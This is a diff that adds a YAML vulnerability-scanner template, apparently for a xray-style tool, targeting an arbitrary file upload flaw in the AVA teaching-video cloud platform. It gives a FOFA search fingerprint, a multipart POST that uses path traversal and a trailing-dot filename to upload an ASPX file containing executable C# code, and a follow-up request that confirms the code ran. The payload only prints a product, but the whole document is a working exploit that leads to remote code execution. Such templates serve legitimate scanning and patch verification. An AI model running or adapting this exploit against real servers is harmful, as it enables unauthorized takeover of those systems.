@@ -1,0 +1,35 @@
+id: poc-yaml-ava-platform-uploadfile
+info:
+  name: 奥威亚 教学视频应用云平台 UploadFile.aspx任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 奥威亚视频云
+  fofa: body="/Upload/DomainInfo/MaxAVALogo.png"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymWx2sFyYKYdxav6y
+  data: '------WebKitFormBoundarymWx2sFyYKYdxav6y
+
+    Content-Disposition: form-data; name="file"; filename="{{.filename}}.aspx."
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="C#"%><% Response.Write({{.t1}} * {{.t2}}); %>
+
+    ------WebKitFormBoundarymWx2sFyYKYdxav6y--
+
+    '
+  expression: "status_code == 200 && \nbody == \"Success\"\n"
+- method: GET
+  path: /{{.filename}}.aspx
+  expression: "status_code == 200 && \nbody == t3\n"
+transport: http
